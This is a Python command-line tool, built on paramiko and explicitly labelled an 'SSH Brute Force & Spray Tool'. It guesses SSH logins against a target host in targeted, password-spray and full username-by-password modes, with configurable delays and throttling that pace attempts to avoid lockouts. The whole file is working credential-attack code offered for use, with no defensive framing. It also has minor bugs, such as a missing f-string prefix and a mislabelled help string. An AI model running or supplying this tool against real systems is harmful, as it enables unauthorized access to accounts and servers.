import paramiko
import argparse
import time
import sys

#Attempt SSH login
def try_ssh_login(host, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # skip known_hosts check
    try:
        ssh.connect(hostname=host, port=port, username=username, password=password, timeout=5)
        ssh.close()
        return True # Login successful
    except paramiko.AuthenticationException:
        return False # Login failed
    except paramiko.ssh_exception.SSHException as e:
        print(f"SSH exception: {e}")
        return False
    except Exception as e:
        print(f" Connection error: {e}")
    
# Handles throttling (after every x attempts)
def throttle_option(attempts, limit, sleep_time):
    if limit and attempts > 0 and attempts % limit == 0:
        print(f" Sleeping {sleep_time} seconds after {limit} attempts...")
        time.sleep(sleep_time)
    
# Mode: targeted (1 user, many passwords)
def brute_single_user(host, port, username, password_file, limit=None, sleep_time=None, delay=0.5):
    attempts = 0
    with open(password_file, "r") as f:
        for line in f:
            password = line.strip()
            attempts+= 1
            if try_ssh_login(host, port, username, password):
                print("Success!: {username}:{password}")
                break
            else:
                print(f"Failed: {username}:{password}")
                throttle_option(attempts, limit, sleep_time)
                time.sleep(delay)

# Mode: spray (multiple users, 1 password)
def spray_usernames(host, port, usernames_file, password, limit=None, sleep_time=None, delay=0.5):
    attempts = 0
    with open(usernames_file, "r") as f:
        for line in f:
            username = line.strip()
            attempts+= 1
            if try_ssh_login(host, port, username, password):
                print(f" Success! {username}:{password}")
                break
            else:
                print(f"Failed: {username}:{password}")
                throttle_option(attempts, limit, sleep_time)
                time.sleep(delay)

# Mode: broadside (multiple users, multiple passwords)
def brute_user_pass(host, port, usernames_file, passwords_file, limit=None, sleep_time=None, delay=0.5):
    attempts = 0
    with open(usernames_file, "r") as uf:
        users = [line.strip() for line in uf if line.strip()]
    with open(passwords_file, "r") as pf:
        passwords = [line.strip() for line in pf if line.strip()]

    for user in users:
        for password in passwords:
            attempts += 1
            if try_ssh_login(host, port, user, password):
                print(f"Success!: {user}:{password}")
                return # Stop on first success
            else:
                print(f"Failed: {user}:{password}")
                throttle_option(attempts, limit, sleep_time)
                time.sleep(delay)

# argument parsing and mode routing

def main():
    # required baseline arguments
    parser = argparse.ArgumentParser(description="SSH Brute Force & Spray Tool")
    parser.add_argument("--host", required=True, help="Target IP or hostname")
    parser.add_argument("--port", type=int, default=22, help="SSH port (default:22)")
    parser.add_argument("--mode", required=True, choices=["targeted", "spray", "broadside"], help="Attack mode")

    # username/password input arguments
    parser.add_argument("--username", help="Single username (for targeted)")
    parser.add_argument("--userfile", help="File with passwords (for targeted/broadside)")
    parser.add_argument("--password", help="Single password (for spray)")
    parser.add_argument("--passfile", help="File with passwords (for targeted/full)")

    # sleep/limit input arguments
    parser.add_argument("--limit", type=int, help="Number of attempts before waiting")
    parser.add_argument("--sleep", type=int, help="Seconds to sleep between attempt batches")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between each attempt (default: 0.5s)")

    args = parser.parse_args()

    if args.mode == "targeted":
        if not args.username or not args.passfile:
            print("'targeted' mode requires --username and --passfile")
            sys.exit(1)
        brute_single_user(args.host, args.port, args.username, args.passfile, args.limit, args.sleep, args.delay)

    elif args.mode == "spray":
        if not args.userfile or not args.password:
            print("'spray' mode requires --userfile and --password")
            sys.exit(1)
        spray_usernames(args.host, args.port, args.userfile, args.password, args.limit, args.sleep, args.delay)

    elif args.mode == "broadside":
        if not args.userfile or not args.passfile:
            print("'full' mode requires --userfile and --passfile")
            sys.exit(1)
        brute_user_pass(args.host, args.port, args.userfile, args.passfile, args.limit, args.sleep, args.delay)

if __name__ == "__main__":
    main()
